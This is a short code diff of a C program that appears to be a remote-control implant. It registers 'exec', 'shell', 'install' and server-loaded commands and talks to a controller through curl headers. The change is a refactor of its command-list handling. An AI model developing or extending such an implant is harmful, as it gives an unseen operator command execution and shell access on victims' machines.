@@ -48,7 +48,7 @@ char* CMD_gogo(char* args)
     CommandNode* tester = func();
     debugf("Tester: %s\n", tester->command);
 
-    insertCommandNode(&clientinfo.commandList, createCommandNode(tester->command, tester->function));
+    insertCommandNode(clientinfo.commandList, createCommandNode(tester->command, tester->function));
     SAFE_FREE(clientinfo.data_commands);
     clientinfo.data_commands = getCommands(clientinfo.commandList, NULL);
     update_curl_headers();
@@ -108,8 +108,9 @@ void check_response(char* data)
 
 int main(void)
 {
+    debugf("main.\n");
     // Initialize the CommandStruct
-    clientinfo.commandList     = NULL;
+    clientinfo.commandList     = create_list();
     clientinfo.header_command  = HEADER_KEY_COMMAND;
     clientinfo.header_commands = HEADER_KEY_COMMANDS;
     clientinfo.header_clientid = HEADER_KEY_CLIENTID;
@@ -123,11 +124,11 @@ int main(void)
     curl_global_init(CURL_GLOBAL_DEFAULT);
 
     // Initialize built-in commands
-    insertCommandNode(&clientinfo.commandList, createCommandNode("exec", CMD_exec));
-    insertCommandNode(&clientinfo.commandList, createCommandNode("shell", CMD_shell));
-    insertCommandNode(&clientinfo.commandList, createCommandNode("gogo", CMD_gogo));
-    insertCommandNode(&clientinfo.commandList, createCommandNode("quit", CMD_quit));
-    insertCommandNode(&clientinfo.commandList, createCommandNode("install", CMD_install));
+    insertCommandNode(clientinfo.commandList, createCommandNode("exec", CMD_exec));
+    insertCommandNode(clientinfo.commandList, createCommandNode("shell", CMD_shell));
+    insertCommandNode(clientinfo.commandList, createCommandNode("gogo", CMD_gogo));
+    insertCommandNode(clientinfo.commandList, createCommandNode("quit", CMD_quit));
+    insertCommandNode(clientinfo.commandList, createCommandNode("install", CMD_install));
 
     // Initialize available commands that the server returns; updated in `gogo` command
     debugf("Getting commands\n");
